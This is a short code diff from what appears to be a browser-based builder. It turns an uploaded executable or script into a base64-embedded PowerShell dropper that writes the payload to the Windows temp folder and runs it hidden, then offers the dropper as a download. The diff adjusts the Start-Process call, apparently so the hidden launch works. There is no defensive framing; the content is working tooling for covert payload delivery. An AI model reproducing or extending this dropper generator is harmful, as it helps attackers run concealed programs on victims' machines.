@@ -157,7 +157,7 @@
                 const base64String = event.target.result.split(',')[1];
                 finalPSCode = `
                 $b="${base64String}";[IO.File]::WriteAllBytes("$env:TEMP\\executable.exe",[Convert]::FromBase64String($b));
-                Start-Process -FilePath "$env:TEMP\\executable.exe" -WindowStyle Hidden -NoNewWindow -PassThru | Out-Null;
+                Start-Process -FilePath "$env:TEMP\\executable.exe" -WindowStyle Hidden;
                 `;
                 document.getElementById("ps-output").textContent = "PowerShell Code: " + finalPSCode.trim().substring(0, 50) + '...';
             };
@@ -183,7 +183,7 @@
             const psFileContent = `
             $code = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('${encodedCode}'));
             Set-Content -Path "$env:TEMP\\script.ps1" -Value $code;
-            Start-Process -FilePath "$env:TEMP\\script.ps1" -WindowStyle Hidden -NoNewWindow -PassThru | Out-Null;
+            Start-Process -FilePath "$env:TEMP\\script.ps1" -WindowStyle Hidden;
             `.trim();
 
             const blob = new Blob([psFileContent], { type: 'application/octet-stream' });
